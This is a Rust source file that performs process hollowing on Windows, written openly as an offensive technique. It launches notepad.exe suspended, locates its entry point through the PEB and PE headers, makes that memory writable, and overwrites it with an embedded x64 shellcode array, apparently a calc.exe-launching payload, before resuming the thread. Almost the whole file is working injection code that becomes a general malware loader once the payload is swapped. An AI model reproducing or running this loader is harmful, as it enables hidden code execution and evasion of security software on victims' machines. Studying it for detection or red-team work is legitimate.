/* 
    Process Hollowing Technique 
    Special Thanks to m0n0ph1 for Great Explanation: https://github.com/m0n0ph1/Process-Hollowing/tree/master
    @5mukx (^_^)
*/ 

extern crate winapi;

use std::ptr::{null_mut, null};
use std::ffi::CString;
use std::mem::{size_of, zeroed};
use winapi::um::processthreadsapi::{CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA};
use winapi::um::winbase::CREATE_SUSPENDED;
use winapi::um::memoryapi::{ReadProcessMemory, WriteProcessMemory, VirtualProtectEx};
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use winapi::um::handleapi::CloseHandle;
use winapi::um::errhandlingapi::GetLastError;
use winapi::shared::ntdef::PSTR;
use ntapi::ntpsapi::PROCESS_BASIC_INFORMATION;
use ntapi::ntpsapi::NtQueryInformationProcess;


macro_rules! okey {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[+] {}", format!($msg, $($arg), *));
    }
}

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[-] {}", format!($msg, $($arg), *));
    }
}

fn main() {
    unsafe {

    let shellcode: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,  
    ];

        let target = CString::new("C:\\Windows\\System32\\notepad.exe").expect("CString::new failed");
        let mut startup_info: STARTUPINFOA = zeroed();
        let mut process_info: PROCESS_INFORMATION = zeroed();

        let process = CreateProcessA(
            null(),
            target.as_ptr() as PSTR,
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut process_info,
        );

        if process == 0 {
            error!("Failed to Create Process : {}", GetLastError());
            return;
        }

        let mut process_basic_info: PROCESS_BASIC_INFORMATION = zeroed();
        let status = NtQueryInformationProcess(
            process_info.hProcess,
            0, // ProcessBasicInformation
            &mut process_basic_info as *mut _ as *mut _,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            null_mut(),
        );

        if status != 0 {
            error!("Failed to Query Process Information : {}", GetLastError());
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return;
        }

        let image_base_address = process_basic_info.PebBaseAddress as *mut u8;
        let mut base_address = 0;
        let read_result = ReadProcessMemory(
            process_info.hProcess,
            image_base_address.offset(0x10) as *const _,
            &mut base_address as *mut _ as *mut _,
            size_of::<usize>(),
            null_mut(),
        );

        if read_result == 0 {
            error!("Failed to read the process memory: {}", GetLastError());
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return;
        }

        let mut headers: [u8; 0x200] = [0; 0x200];
        let read_result = ReadProcessMemory(
            process_info.hProcess,
            base_address as *const _,
            headers.as_mut_ptr() as *mut _,
            headers.len(),
            null_mut(),
        );

        if read_result == 0 {
            error!("Failed to read PE headers: {}", GetLastError());
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return;
        }

        let e_lfanew = *(&headers[0x3C] as *const u8 as *const i32);
        let entry_point_rva = *(&headers[(e_lfanew + 0x28) as usize] as *const u8 as *const u32);
        let entry_point_address = base_address + entry_point_rva as usize;

        let old_protect: u32 = 0;
        let protection = VirtualProtectEx(
            process_info.hProcess,
            entry_point_address as *mut _,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &old_protect as *const _ as *mut _,
        );

        if protection == 0 {
            error!("Failed to change memory protections: {}", GetLastError());
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return;
        }

        let write_result = WriteProcessMemory(
            process_info.hProcess,
            entry_point_address as *mut _,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            null_mut(),
        );

        if write_result == 0 {
            error!("Failed to write shellcode to process memory: {}", GetLastError());
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return;
        }

        let protection = VirtualProtectEx(
            process_info.hProcess,
            entry_point_address as *mut _,
            shellcode.len(),
            old_protect,
            &old_protect as *const _ as *mut _,
        );

        if protection == 0 {
            error!("Failed to restore memory protections: {}", GetLastError());
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return;
        }

        ResumeThread(process_info.hThread);
        okey!("Process Successfully Resumed {}", '!');

        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
    }
}


